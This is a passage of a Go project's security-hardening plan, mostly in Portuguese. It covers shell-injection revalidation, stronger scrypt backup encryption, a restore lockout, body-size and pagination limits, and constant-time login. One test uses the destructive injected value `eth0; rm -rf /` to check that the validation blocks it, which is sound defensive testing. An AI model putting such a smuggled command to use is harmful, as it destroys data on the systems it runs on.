func (f *spyExecutor) Execute(ctx context.Context, name string, args ...string) (string, error) {
	f.calls++
	return "", nil
}
func (f *spyExecutor) ExecuteRead(ctx context.Context, name string, args ...string) (string, error) {
	return "", nil
}
func (f *spyExecutor) IsDryRun() bool { return true }

func TestArmWatchdogSkipsMalformedInterface(t *testing.T) {
	spy := &spyExecutor{}
	s := &Service{exec: spy}
	s.armWatchdog(&Test{Interface: `eth0; rm -rf /`, DurationSec: 30})
	if spy.calls != 0 {
		t.Fatalf("expected armWatchdog to skip exec.Execute for a malformed interface, got %d calls", spy.calls)
	}
}

func TestArmWatchdogRunsForValidInterface(t *testing.T) {
	spy := &spyExecutor{}
	s := &Service{exec: spy}
	s.armWatchdog(&Test{Interface: "enp3s0", DurationSec: 30})
	if spy.calls != 1 {
		t.Fatalf("expected armWatchdog to call exec.Execute once for a valid interface, got %d calls", spy.calls)
	}
}
```

- [ ] **Step 2: Rodar o teste e confirmar que falha**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/stresstest/... -run TestArmWatchdog -v`
Expected: FAIL — `TestArmWatchdogSkipsMalformedInterface` falha (`spy.calls` é 1, não 0 — hoje
`armWatchdog` executa o comando `sh -c` mesmo com uma interface malformada, sem validação local).
`TestArmWatchdogRunsForValidInterface` já deve passar antes da correção (comportamento legítimo não
muda).

- [ ] **Step 3: Implementar**

Adicionar `"log/slog"` aos imports de `internal/stresstest/service.go` (ainda não está lá). Trocar
`armWatchdog`:

```go
// armWatchdog spawns a detached process that force-restores the link/tc after
// the deadline no matter what — even if this process dies mid-test.
func (s *Service) armWatchdog(t *Test) {
	ctx, cancel := bg()
	defer cancel()
	margin := t.DurationSec + 60
	restore := fmt.Sprintf("ip link set %s up; tc qdisc del dev %s root 2>/dev/null",
		t.Interface, t.Interface)
	cmd := fmt.Sprintf("setsid sh -c 'sleep %d; %s' </dev/null >/dev/null 2>&1 &", margin, restore)
	_, _ = s.exec.Execute(ctx, "sh", "-c", cmd)
}
```

por:

```go
// armWatchdog spawns a detached process that force-restores the link/tc after
// the deadline no matter what — even if this process dies mid-test.
func (s *Service) armWatchdog(t *Test) {
	// Defense in depth: t.Interface is already validated (against this same
	// reIface) in Start() before a Test is ever constructed, but this is the
	// codebase's only sh -c call — re-checking here means a future refactor or
	// new caller that skips Start()'s validation can't silently reintroduce
	// shell injection through this one spot.
	if !reIface.MatchString(t.Interface) {
		slog.Error("armWatchdog: interface inválida, watchdog não armado", "interface", t.Interface)
		return
	}
	ctx, cancel := bg()
	defer cancel()
	margin := t.DurationSec + 60
	restore := fmt.Sprintf("ip link set %s up; tc qdisc del dev %s root 2>/dev/null",
		t.Interface, t.Interface)
	cmd := fmt.Sprintf("setsid sh -c 'sleep %d; %s' </dev/null >/dev/null 2>&1 &", margin, restore)
	_, _ = s.exec.Execute(ctx, "sh", "-c", cmd)
}
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/stresstest/... -v`
Expected: PASS — os 2 testes novos, e o resto da suíte do pacote (confirmando que uma interface
legítima, já validada em `Start()`, continua armando o watchdog sem regressão).

- [ ] **Step 5: Commit**

```bash
git add internal/stresstest/
git commit -m "fix(stresstest): revalidar interface dentro de armWatchdog (defesa em profundidade no único sh -c do projeto)"
```

---

### Task 10 (MINOR): scrypt mais forte, com formato versionado

**Files:**
- Modify: `internal/backupcrypt/backupcrypt.go`
- Test: `internal/backupcrypt/backupcrypt_test.go` (estender)

- [ ] **Step 1: Escrever os testes que falham**

Adicionar a `internal/backupcrypt/backupcrypt_test.go`:

```go
func TestEncryptUsesLGB2WithStrongerN(t *testing.T) {
	ciphertext, err := Encrypt([]byte("dado"), "senha-123456789012")
	if err != nil {
		t.Fatalf("Encrypt: %v", err)
	}
	if string(ciphertext[:4]) != "LGB2" {
		t.Fatalf("expected new files to use LGB2 magic, got %q", ciphertext[:4])
	}
}

func TestDecryptStillOpensLegacyLGB1Files(t *testing.T) {
	// Hand-build an LGB1 file (old format: magic + salt + nonce + ciphertext,
	// fixed N=32768) the way the pre-fix Encrypt used to, to prove old backups
	// already sent/downloaded before this change still restore correctly.
	passphrase := "senha-antiga-123456"
	salt := make([]byte, saltSize)
	for i := range salt {
		salt[i] = byte(i)
	}
	key, err := scrypt.Key([]byte(passphrase), salt, 32768, 8, 1, keySize)
	if err != nil {
		t.Fatalf("scrypt.Key: %v", err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatalf("aes.NewCipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatalf("cipher.NewGCM: %v", err)
	}
	nonce := make([]byte, gcm.NonceSize())
	plaintext := []byte("backup antigo")
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)

	legacyFile := append([]byte("LGB1"), salt...)
	legacyFile = append(legacyFile, nonce...)
	legacyFile = append(legacyFile, ciphertext...)

	got, err := Decrypt(legacyFile, passphrase)
	if err != nil {
		t.Fatalf("Decrypt of a legacy LGB1 file failed: %v", err)
	}
	if string(got) != string(plaintext) {
		t.Fatalf("decrypted content mismatch: got %q, want %q", got, plaintext)
	}
}

func TestEncryptDecryptRoundTripStillWorksLGB2(t *testing.T) {
	plaintext := []byte(`{"kind":"linkguard-fw-backup"}`)
	ciphertext, err := Encrypt(plaintext, "senha-nova-123456789")
	if err != nil {
		t.Fatalf("Encrypt: %v", err)
	}
	got, err := Decrypt(ciphertext, "senha-nova-123456789")
	if err != nil {
		t.Fatalf("Decrypt: %v", err)
	}
	if string(got) != string(plaintext) {
		t.Fatalf("round trip mismatch: got %q, want %q", got, plaintext)
	}
}
```

Este teste usa `scrypt`, `aes`, `cipher` diretamente — já devem estar disponíveis via o import do
pacote (`golang.org/x/crypto/scrypt`, `crypto/aes`, `crypto/cipher`); adicione ao `_test.go` se o
arquivo de teste ainda não os importa (o arquivo de produção já importa todos os três).

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/backupcrypt/... -v`
Expected: FAIL — `TestEncryptUsesLGB2WithStrongerN` (magic ainda é "LGB1") e
`TestDecryptStillOpensLegacyLGB1Files` (formato antigo ainda é o único suportado, então este
especificamente já passaria hoje — confirme que ele PASSA antes e DEPOIS da mudança, é o teste de
não-regressão; só o primeiro teste deve falhar antes da implementação).

- [ ] **Step 3: Implementar**

Trocar `internal/backupcrypt/backupcrypt.go` inteiro:

```go
// Package backupcrypt encrypts and decrypts the LinkGuard FW backup file.
// AES-256-GCM with a key derived from a user passphrase via scrypt — pure
// algorithm, no knowledge of HTTP, storage, or what BackupData looks like.
package backupcrypt

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"

	"golang.org/x/crypto/scrypt"
)

// magicLegacy (LGB1) is the original fixed-cost format: magic + salt + nonce +
// ciphertext, always N=legacyScryptN. magicCurrent (LGB2) is written by every
// new Encrypt call and embeds N explicitly (4 bytes, big-endian) right after
// the magic, so a future cost bump doesn't strand already-issued files again —
// Decrypt reads whichever N the file says to use instead of assuming a fixed
// constant.
var (
	magicLegacy  = []byte("LGB1")
	magicCurrent = []byte("LGB2")
)

const (
	saltSize = 16
	// legacyScryptN is the fixed N used by every LGB1 file ever written
	// (before this format version existed) — never change this constant, it
	// exists only to keep decrypting old files correct.
	legacyScryptN = 32768
	// scryptN is what Encrypt uses today — RFC 7914's guidance for a
	// long-lived, offline-attackable file (not just an interactive login) is
	// closer to 2^20; 2^17 is a deliberate middle ground that stays under ~1s
	// on modest hardware while raising the offline-bruteforce cost well above
	// the previous 2^15.
	scryptN = 131072
	scryptR = 8
	scryptP = 1
	keySize = 32 // AES-256
)

// ErrInvalidFormat means data is not a recognizable LinkGuard backup file
// (wrong magic, or too short to contain one) — distinct from a wrong
// passphrase, which fails inside GCM's authentication check instead.
var ErrInvalidFormat = errors.New("backupcrypt: not a valid LinkGuard backup file")

// Encrypt derives a key from passphrase via scrypt (fresh random salt every
// call) and seals plaintext with AES-256-GCM (fresh random nonce every call).
// Always writes the current format (LGB2): magic + N (4 bytes) + salt + nonce
// + ciphertext.
func Encrypt(plaintext []byte, passphrase string) ([]byte, error) {
	salt := make([]byte, saltSize)
	if _, err := rand.Read(salt); err != nil {
		return nil, fmt.Errorf("gerar salt: %w", err)
	}
	key, err := scrypt.Key([]byte(passphrase), salt, scryptN, scryptR, scryptP, keySize)
	if err != nil {
		return nil, fmt.Errorf("derivar chave: %w", err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("criar cipher: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("criar GCM: %w", err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("gerar nonce: %w", err)
	}
	ciphertext := gcm.Seal(nil, nonce, plaintext, nil)

	nBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(nBytes, uint32(scryptN))

	out := make([]byte, 0, len(magicCurrent)+len(nBytes)+len(salt)+len(nonce)+len(ciphertext))
	out = append(out, magicCurrent...)
	out = append(out, nBytes...)
	out = append(out, salt...)
	out = append(out, nonce...)
	out = append(out, ciphertext...)
	return out, nil
}

// Decrypt reverses Encrypt for either format: LGB1 (fixed legacyScryptN) or
// LGB2 (N embedded in the file). A wrong passphrase or a tampered file both
// fail (GCM is authenticated) — never decrypts silently into garbage.
func Decrypt(data []byte, passphrase string) ([]byte, error) {
	if len(data) < 4 {
		return nil, ErrInvalidFormat
	}
	var n int
	var offset int
	switch {
	case bytes.Equal(data[:4], magicLegacy):
		n = legacyScryptN
		offset = 4
	case bytes.Equal(data[:4], magicCurrent):
		if len(data) < 8 {
			return nil, ErrInvalidFormat
		}
		n = int(binary.BigEndian.Uint32(data[4:8]))
		offset = 8
	default:
		return nil, ErrInvalidFormat
	}
	if len(data) < offset+saltSize {
		return nil, ErrInvalidFormat
	}
	salt := data[offset : offset+saltSize]
	offset += saltSize

	key, err := scrypt.Key([]byte(passphrase), salt, n, scryptR, scryptP, keySize)
	if err != nil {
		return nil, fmt.Errorf("derivar chave: %w", err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("criar cipher: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("criar GCM: %w", err)
	}
	nonceSize := gcm.NonceSize()
	if len(data) < offset+nonceSize {
		return nil, ErrInvalidFormat
	}
	nonce := data[offset : offset+nonceSize]
	offset += nonceSize
	ciphertext := data[offset:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("senha incorreta ou arquivo inválido: %w", err)
	}
	return plaintext, nil
}
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/backupcrypt/... ./internal/backup/... -v`
Expected: PASS — todos os testes deste pacote E de `internal/backup` (que consome `backupcrypt` —
confirme que `EncryptSnapshot`/`DecryptRestore` continuam funcionando com o formato novo, já que eles
não hardcodam nada sobre o formato interno, só chamam `Encrypt`/`Decrypt`).

- [ ] **Step 5: Commit**

```bash
git add internal/backupcrypt/
git commit -m "fix(backupcrypt): scrypt N sobe pra 2^17 com formato versionado (LGB2, mantém LGB1 legível)"
```

---

### Task 11 (MINOR): Endurecimento do restore de backup (rate-limit + tamanho)

**Files:**
- Modify: `internal/api/handlers/backup.go`
- Test: `internal/api/handlers/backup_test.go` (estender)

- [ ] **Step 1: Escrever os testes que falham**

Adicionar a `internal/api/handlers/backup_test.go`:

```go
func TestRestoreLocksOutAfterRepeatedWrongPassphrase(t *testing.T) {
	h, sec := newBackupTestHandler(t)
	if err := sec.Set(backup.PassphraseSecretName, "senha-certa-123456"); err != nil {
		t.Fatalf("sec.Set: %v", err)
	}
	req := httptest.NewRequest(http.MethodGet, "/api/backup", nil)
	w := httptest.NewRecorder()
	h.Export(w, req)
	encrypted := w.Body.Bytes()

	var lastCode int
	for i := 0; i < 10; i++ {
		body, contentType := multipartRestoreBody(t, encrypted, "senha-errada-123456")
		rreq := httptest.NewRequest(http.MethodPost, "/api/backup/restore", body)
		rreq.Header.Set("Content-Type", contentType)
		rreq = rreq.WithContext(auth.ContextWithClaims(rreq.Context(), &auth.Claims{UserID: "u1", Username: "tester"}))
		rw := httptest.NewRecorder()
		h.Restore(rw, rreq)
		lastCode = rw.Code
	}
	if lastCode != http.StatusTooManyRequests {
		t.Fatalf("expected 429 after repeated wrong-passphrase attempts, got %d", lastCode)
	}
}

func TestRestoreRejectsOversizedBody(t *testing.T) {
	h, sec := newBackupTestHandler(t)
	if err := sec.Set(backup.PassphraseSecretName, "senha-certa-123456"); err != nil {
		t.Fatalf("sec.Set: %v", err)
	}
	oversized := make([]byte, 33<<20) // 33MB, over the 32MB cap
	body, contentType := multipartRestoreBody(t, oversized, "senha-certa-123456")
	rreq := httptest.NewRequest(http.MethodPost, "/api/backup/restore", body)
	rreq.Header.Set("Content-Type", contentType)
	rreq = rreq.WithContext(auth.ContextWithClaims(rreq.Context(), &auth.Claims{UserID: "u1", Username: "tester"}))
	rw := httptest.NewRecorder()
	h.Restore(rw, rreq)
	if rw.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for oversized upload, got %d", rw.Code)
	}
}
```

Isso usa `auth.ContextWithClaims` — já adicionado no Task 6; se este task rodar antes do Task 6 por
algum motivo, mova a criação desse helper pra cá (é idempotente adicionar uma vez só; o Task 6
adiciona a MESMA função, então confira se já existe antes de duplicar — `grep -n
"func ContextWithClaims" internal/auth/middleware.go` — e pule esta parte se já existir).

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/api/handlers/... -run 'TestRestoreLocksOut|TestRestoreRejectsOversized' -v`
Expected: FAIL — hoje não há lockout nem `MaxBytesReader` no restore.

- [ ] **Step 3: Implementar**

Em `internal/api/handlers/backup.go`, adicionar um limitador de tentativas simples ao `BackupHandler`
(mesma ideia do lockout de login, mas escopado por usuário autenticado, não por IP — o restore já
exige `system.write`, então o "quem" já é conhecido). Adicionar ao struct e construtor:

```go
type BackupHandler struct {
	db      *storage.DB
	sec     secrets.Secrets
	version string
	sched   *backup.Scheduler

	mu             sync.Mutex
	failedRestores map[string]*restoreAttempts
}

type restoreAttempts struct {
	count     int
	lockUntil time.Time
}

const (
	maxRestoreAttempts = 5
	restoreLockout     = 5 * time.Minute
)

func NewBackupHandler(db *storage.DB, sec secrets.Secrets, version string, sched *backup.Scheduler) *BackupHandler {
	return &BackupHandler{db: db, sec: sec, version: version, sched: sched, failedRestores: map[string]*restoreAttempts{}}
}
```

Adicionar os métodos de controle de tentativa (perto de `Restore`):

```go
func (h *BackupHandler) restoreLockedOut(userID string) bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	a := h.failedRestores[userID]
	return a != nil && time.Now().Before(a.lockUntil)
}

func (h *BackupHandler) recordRestoreFailure(userID string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	a := h.failedRestores[userID]
	if a == nil {
		a = &restoreAttempts{}
		h.failedRestores[userID] = a
	}
	a.count++
	if a.count >= maxRestoreAttempts {
		a.lockUntil = time.Now().Add(restoreLockout)
		a.count = 0
	}
}

func (h *BackupHandler) resetRestoreAttempts(userID string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	delete(h.failedRestores, userID)
}
```

Trocar o início de `Restore`:

```go
func (h *BackupHandler) Restore(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		writeError(w, http.StatusBadRequest, "requisição inválida")
		return
	}
	passphrase := r.FormValue("passphrase")
	if passphrase == "" {
		writeError(w, http.StatusBadRequest, "informe a senha do backup")
		return
	}
	file, _, err := r.FormFile("file")
	if err != nil {
		writeError(w, http.StatusBadRequest, "arquivo de backup ausente")
		return
	}
	defer file.Close()
	ciphertext, err := io.ReadAll(file)
	if err != nil {
		writeError(w, http.StatusBadRequest, "não foi possível ler o arquivo")
		return
	}

	data, err := backup.DecryptRestore(ciphertext, passphrase)
	if err != nil {
		writeError(w, http.StatusBadRequest, "senha incorreta ou arquivo inválido")
		return
	}
```

por:

```go
func (h *BackupHandler) Restore(w http.ResponseWriter, r *http.Request) {
	claims := auth.ClaimsFromContext(r.Context())
	if claims == nil {
		writeError(w, http.StatusUnauthorized, "unauthorized")
		return
	}
	if h.restoreLockedOut(claims.UserID) {
		writeError(w, http.StatusTooManyRequests, "muitas tentativas com senha incorreta. Tente novamente em alguns minutos.")
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, 32<<20)
	if err := r.ParseMultipartForm(32 << 20); err != nil {
		writeError(w, http.StatusBadRequest, "requisição inválida ou arquivo maior que 32MB")
		return
	}
	passphrase := r.FormValue("passphrase")
	if passphrase == "" {
		writeError(w, http.StatusBadRequest, "informe a senha do backup")
		return
	}
	file, _, err := r.FormFile("file")
	if err != nil {
		writeError(w, http.StatusBadRequest, "arquivo de backup ausente")
		return
	}
	defer file.Close()
	ciphertext, err := io.ReadAll(file)
	if err != nil {
		writeError(w, http.StatusBadRequest, "não foi possível ler o arquivo")
		return
	}

	data, err := backup.DecryptRestore(ciphertext, passphrase)
	if err != nil {
		h.recordRestoreFailure(claims.UserID)
		writeError(w, http.StatusBadRequest, "senha incorreta ou arquivo inválido")
		return
	}
	h.resetRestoreAttempts(claims.UserID)
```

Adicionar aos imports de `internal/api/handlers/backup.go`: `"sync"`, `"time"`,
`"github.com/giovanibalarini/linkguard-fw/internal/auth"` (se ainda não estiverem).

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/api/handlers/... -v`
Expected: PASS — todos os testes do pacote, incluindo os de restore já existentes (senha certa em
menos de 5 tentativas continua funcionando normalmente).

- [ ] **Step 5: Commit**

```bash
git add internal/api/handlers/backup.go internal/api/handlers/backup_test.go
git commit -m "fix(backup): lockout de tentativas + tamanho máximo real no restore"
```

---

### Task 12 (MINOR): Limite global de tamanho de requisição + teto de paginação

**Files:**
- Modify: `internal/api/server.go`
- Modify: `internal/api/handlers/logs.go`
- Modify: `internal/api/handlers/failover.go`
- Test: `internal/api/handlers/logs_test.go` / `failover_test.go` (estender se existirem, senão criar)

**Interfaces:**
- Produces: `func clampLimit(raw string, def, max int) int` (não-exportado, `internal/api/handlers/
  helpers.go`) — usado por `logs.go`'s `List` e `failover.go`'s `ListEvents`.

- [ ] **Step 1: Escrever os testes que falham**

`logs.go`'s `List` parseia `limit` assim hoje (confirmado lendo o arquivo): `limitStr :=
r.URL.Query().Get("limit"); limit := 100; if limitStr != "" { if n, err := strconv.Atoi(limitStr);
err == nil && n > 0 { limit = n } }`. `failover.go`'s `ListEvents` é idêntico, só com default `50`
em vez de `100`. Em vez de duplicar o teto nos dois arquivos, extrai-se um helper único e puro,
testável sem precisar de banco.

Adicionar a `internal/api/handlers/helpers_test.go` (o mesmo arquivo criado no Task 8 — se este task
rodar antes do Task 8, crie o arquivo aqui com `package handlers`):

```go
func TestClampLimitUsesDefaultWhenEmpty(t *testing.T) {
	if got := clampLimit("", 100, 1000); got != 100 {
		t.Fatalf("clampLimit(\"\", 100, 1000) = %d, want 100", got)
	}
}

func TestClampLimitUsesDefaultWhenInvalid(t *testing.T) {
	if got := clampLimit("not-a-number", 100, 1000); got != 100 {
		t.Fatalf("clampLimit invalid input = %d, want default 100", got)
	}
}

func TestClampLimitUsesDefaultWhenZeroOrNegative(t *testing.T) {
	if got := clampLimit("0", 100, 1000); got != 100 {
		t.Fatalf("clampLimit(\"0\", ...) = %d, want default 100", got)
	}
	if got := clampLimit("-5", 100, 1000); got != 100 {
		t.Fatalf("clampLimit(\"-5\", ...) = %d, want default 100", got)
	}
}

func TestClampLimitPassesThroughValidValue(t *testing.T) {
	if got := clampLimit("250", 100, 1000); got != 250 {
		t.Fatalf("clampLimit(\"250\", ...) = %d, want 250", got)
	}
}

func TestClampLimitCapsAtCeiling(t *testing.T) {
	if got := clampLimit("999999999", 100, 1000); got != 1000 {
		t.Fatalf("clampLimit(\"999999999\", 100, 1000) = %d, want capped at 1000", got)
	}
}
```

- [ ] **Step 2: Rodar os testes e confirmar que falham**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/api/handlers/... -run TestClampLimit -v`
Expected: FAIL — `undefined: clampLimit`.

- [ ] **Step 3: Implementar**

Adicionar a `internal/api/handlers/helpers.go` (perto de `decodeJSON`):

```go
// clampLimit parses a "limit" query-string value, falling back to def when
// absent/invalid/non-positive, and never returning more than max — an
// unbounded limit lets a single authenticated request force the server to
// load and serialize an unbounded number of rows.
func clampLimit(raw string, def, max int) int {
	if raw == "" {
		return def
	}
	n, err := strconv.Atoi(raw)
	if err != nil || n <= 0 {
		return def
	}
	if n > max {
		return max
	}
	return n
}
```

(`strconv` já é importado em `helpers.go`? Confira — se não estiver, adicione ao bloco de imports.)

Em `internal/api/handlers/logs.go`, trocar:

```go
	limitStr := r.URL.Query().Get("limit")
	limit := 100
	if limitStr != "" {
		if n, err := strconv.Atoi(limitStr); err == nil && n > 0 {
			limit = n
		}
	}
```

por:

```go
	limit := clampLimit(r.URL.Query().Get("limit"), 100, 1000)
```

(Se `strconv` deixar de ser usado em `logs.go` depois desta troca — confira com `grep -n "strconv"
internal/api/handlers/logs.go` — remova o import não utilizado do arquivo.)

Em `internal/api/handlers/failover.go`, trocar:

```go
	limitStr := r.URL.Query().Get("limit")
	limit := 50
	if limitStr != "" {
		if n, err := strconv.Atoi(limitStr); err == nil && n > 0 {
			limit = n
		}
	}
```

por:

```go
	limit := clampLimit(r.URL.Query().Get("limit"), 50, 1000)
```

(Mesma checagem de import não utilizado de `strconv` neste arquivo depois da troca.)

Em `internal/api/server.go`, adicionar um middleware global de tamanho de corpo. Adicionar a função
(perto de `requestLogger`, mesmo arquivo):

```go
// maxBodySize caps request bodies globally — the vast majority of this API's
// endpoints only ever receive small JSON bodies (a few KB at most). Backup
// restore is the one legitimate exception and raises its own, larger limit
// explicitly before reading its multipart body (see BackupHandler.Restore),
// which overrides this default for that single request.
func maxBodySize(limit int64) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			r.Body = http.MaxBytesReader(w, r.Body, limit)
			next.ServeHTTP(w, r)
		})
	}
}
```

E registrar no chain de middlewares, junto dos já existentes (linha ~133-137, mesmo bloco de
`r.Use(...)`):

```go
	r.Use(middleware.RequestID)
	r.Use(middleware.RealIP)
	r.Use(requestLogger)
	r.Use(middleware.Recoverer)
	r.Use(middleware.Timeout(60 * time.Second))
	r.Use(maxBodySize(2 << 20)) // 2MB — generoso pra qualquer corpo JSON desta API; backup/restore define seu próprio limite maior
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go build ./... && go test ./... -v`
Expected: build limpo, suíte inteira passa — em especial confirme que `TestExportThenRestoreRoundTrip`
(já existente, backup) continua passando, já que o restore precisa exceder os 2MB globais via seu
próprio `MaxBytesReader(w, r.Body, 32<<20)` já adicionado no Task 11 — a ordem dos dois
`MaxBytesReader` (o global do middleware, depois o mais generoso dentro do handler) precisa
funcionar: `http.MaxBytesReader` substitui `r.Body` por um novo reader com o limite mais recente
chamado, então a chamada dentro de `Restore` (Task 11) já sobrescreve corretamente o limite do
middleware global — confirme isso rodando o teste de restore com um payload entre 2MB e 32MB, que
deveria passar.

- [ ] **Step 5: Commit**

```bash
git add internal/api/server.go internal/api/handlers/logs.go internal/api/handlers/failover.go
git commit -m "fix(api): limite global de tamanho de corpo + teto de paginação em logs/failover"
```

---

### Task 13 (MINOR): Login em tempo constante + auditoria de tentativas

**Files:**
- Modify: `internal/auth/service.go`
- Modify: `internal/api/handlers/auth.go`
- Test: `internal/auth/service_test.go` (estender se existir, senão criar)

- [ ] **Step 1: Escrever os testes que falham**

Adicionar a `internal/auth/service_test.go` (crie com `package auth` se não existir; reaproveite
`newMiddlewareTestService` do Task 6 se este arquivo for diferente — ajuste conforme necessário):

```go
func TestLoginPaysBcryptCostEvenForNonexistentUser(t *testing.T) {
	dir := t.TempDir()
	db, err := storage.Open(filepath.Join(dir, "test.db"))
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	defer db.Close()
	svc := NewService(db, "test-secret-at-least-32-bytes-long-xxxx", nil)

	start := time.Now()
	_, _, _ = svc.Login("usuario-que-nao-existe", "qualquer-senha", "")
	elapsed := time.Since(start)

	// bcrypt.DefaultCost typically costs on the order of tens of milliseconds;
	// a nonexistent-user short-circuit before the fix returns in microseconds.
	// This is a coarse check, not a precise timing-attack proof — it just
	// confirms the dummy-hash comparison actually runs.
	if elapsed < 10*time.Millisecond {
		t.Fatalf("Login for a nonexistent user returned too fast (%v) — looks like it's still short-circuiting before paying bcrypt cost", elapsed)
	}
}
```

- [ ] **Step 2: Rodar o teste e confirmar que falha**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/auth/... -run TestLoginPaysBcryptCostEvenForNonexistentUser -v`
Expected: FAIL — hoje `Login` retorna quase instantaneamente pra usuário inexistente.

- [ ] **Step 3: Implementar**

Em `internal/auth/service.go`, adicionar uma constante com um hash bcrypt fixo (gerado uma vez, não
corresponde a senha real nenhuma — só existe pra dar ao `bcrypt.CompareHashAndPassword` algo custoso
pra comparar mesmo quando não há usuário):

```go
// dummyHash has no corresponding real password — it exists purely so Login
// pays the same bcrypt cost whether the username exists or not, closing a
// timing side-channel that let an unauthenticated caller enumerate valid
// usernames by measuring response latency.
const dummyHash = "$2a$10$CwTycUXWue0Thq9StjUM0uJ8lhLevf0hkgzYzMXV6ZLqQGz9Y0h9G"
```

Trocar `Login`:

```go
	user, err := s.db.GetUserByUsername(username)
	if err != nil {
		return "", nil, fmt.Errorf("lookup user: %w", err)
	}
	if user == nil {
		s.recordFailure(key)
		return "", nil, errors.New("invalid credentials")
	}

	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(rawPassword)); err != nil {
		s.recordFailure(key)
		return "", nil, errors.New("invalid credentials")
	}
```

por:

```go
	user, err := s.db.GetUserByUsername(username)
	if err != nil {
		return "", nil, fmt.Errorf("lookup user: %w", err)
	}
	if user == nil {
		// Compare against a dummy hash so this path costs the same as a real
		// wrong-password check below — otherwise "user doesn't exist" returns
		// near-instantly while "wrong password" pays bcrypt's ~50-200ms, and
		// that timing gap alone lets an attacker enumerate valid usernames.
		_ = bcrypt.CompareHashAndPassword([]byte(dummyHash), []byte(rawPassword))
		s.recordFailure(key)
		return "", nil, errors.New("invalid credentials")
	}

	if err := bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(rawPassword)); err != nil {
		s.recordFailure(key)
		return "", nil, errors.New("invalid credentials")
	}
```

Em `internal/api/handlers/auth.go`, adicionar auditoria aos 3 desfechos de `Login`. Trocar:

```go
	token, user, err := h.svc.Login(body.Username, body.Password, body.Code)
	if err != nil {
		switch {
		case errors.Is(err, auth.ErrTOTPRequired):
			// Password OK; the client must now present a 2FA code.
			writeJSON(w, http.StatusUnauthorized, map[string]interface{}{
				"error":         "two-factor code required",
				"totp_required": true,
			})
		case errors.Is(err, auth.ErrLockedOut):
			writeJSON(w, http.StatusTooManyRequests, map[string]interface{}{
				"error":      "muitas tentativas. Tente novamente em alguns minutos.",
				"locked_out": true,
			})
		default:
			writeError(w, http.StatusUnauthorized, "invalid credentials")
		}
		return
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"token": token,
		"user": map[string]string{
			"id":       user.ID,
			"username": user.Username,
			"role":     user.Role,
		},
	})
```

por:

```go
	token, user, err := h.svc.Login(body.Username, body.Password, body.Code)
	if err != nil {
		switch {
		case errors.Is(err, auth.ErrTOTPRequired):
			// Password OK; the client must now present a 2FA code. Not a
			// failure yet — don't audit-log this as one.
			writeJSON(w, http.StatusUnauthorized, map[string]interface{}{
				"error":         "two-factor code required",
				"totp_required": true,
			})
		case errors.Is(err, auth.ErrLockedOut):
			auditAction(h.db, r, "login.locked_out", "user:"+body.Username, "")
			writeJSON(w, http.StatusTooManyRequests, map[string]interface{}{
				"error":      "muitas tentativas. Tente novamente em alguns minutos.",
				"locked_out": true,
			})
		default:
			auditAction(h.db, r, "login.failure", "user:"+body.Username, "")
			writeError(w, http.StatusUnauthorized, "invalid credentials")
		}
		return
	}

	auditAction(h.db, r, "login.success", "user:"+user.Username, "")
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"token": token,
		"user": map[string]string{
			"id":       user.ID,
			"username": user.Username,
			"role":     user.Role,
		},
	})
```

- [ ] **Step 4: Rodar os testes e confirmar que passam**

Run: `export PATH="/home/gov/sdk/go1.25.0/bin:$PATH" && go test ./internal/auth/... ./internal/api/handlers/... -v`
Expected: PASS — todos os testes.

- [ ] **Step 5: Commit**

```bash
git add internal/auth/service.go internal/api/handlers/auth.go
git commit -m "fix(auth): login em tempo constante (anti-enumeração) + auditoria de tentativas"
```

---

## Ordem de execução

Ordem numérica (1→13) é a ordem de execução real — segue-a à risca, não é só uma sugestão. Duas
dependências entre tasks não-adjacentes, ambas já refletidas nessa ordem:
- **Task 2 cria `ContextWithClaims`** em `internal/auth/middleware.go` (com guarda "confira se já
  existe" — é a primeira task do plano a precisar desse helper de teste). **Task 6 reaproveita** essa
